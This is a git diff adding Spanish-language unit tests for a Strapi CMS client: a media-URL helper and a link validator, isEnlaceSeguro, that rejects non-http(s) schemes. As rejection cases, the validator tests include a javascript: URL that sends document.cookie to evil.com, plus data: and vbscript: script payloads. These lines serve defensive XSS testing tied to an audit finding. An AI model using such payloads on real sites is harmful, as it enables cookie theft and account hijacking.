@@ -14,7 +14,10 @@ import {
   fetchCanalesAyuda,
   fetchQuienesSomos,
   fetchHome,
+  getStrapiMediaUrl,
+  isEnlaceSeguro,
 } from '../../src/lib/strapi';
+import type { StrapiMedia } from '../../src/lib/types';
 
 beforeEach(() => {
   vi.unstubAllGlobals();
@@ -192,6 +195,40 @@ describe('funciones de dominio — apuntan al endpoint correcto y degradan con g
     expect(result).toBeNull();
     const calledUrl = mockFetch.mock.calls[0][0] as string;
     expect(calledUrl).toContain('/api/home');
+  });
+});
+
+describe('getStrapiMediaUrl (F3-01/03 — hallazgo AUDIT_04)', () => {
+  function media(url: string): StrapiMedia {
+    return { id: 1, url, alternativeText: null, width: null, height: null };
+  }
+
+  it('prefija con STRAPI_URL una URL relativa (proveedor local de Strapi)', () => {
+    expect(getStrapiMediaUrl(media('/uploads/reglamento_abc.pdf'))).toBe(
+      'https://cms.sprintjudicial.com/uploads/reglamento_abc.pdf',
+    );
+  });
+
+  it('deja intacta una URL ya absoluta (proveedor externo tipo CDN)', () => {
+    expect(getStrapiMediaUrl(media('https://cdn.externo.com/archivo.pdf'))).toBe(
+      'https://cdn.externo.com/archivo.pdf',
+    );
+  });
+});
+
+describe('isEnlaceSeguro (F3-03/06 — hallazgo AUDIT_04)', () => {
+  it('acepta http y https', () => {
+    expect(isEnlaceSeguro('https://youtube.com/watch?v=abc')).toBe(true);
+    expect(isEnlaceSeguro('http://ejemplo.com/formulario')).toBe(true);
+  });
+
+  it('rechaza javascript: (XSS si una cuenta editora de Strapi es comprometida)', () => {
+    expect(isEnlaceSeguro("javascript:fetch('//evil.com/'+document.cookie)")).toBe(false);
+  });
+
+  it('rechaza data: y otros esquemas no http(s)', () => {
+    expect(isEnlaceSeguro('data:text/html,<script>alert(1)</script>')).toBe(false);
+    expect(isEnlaceSeguro('vbscript:msgbox(1)')).toBe(false);
   });
 });
 
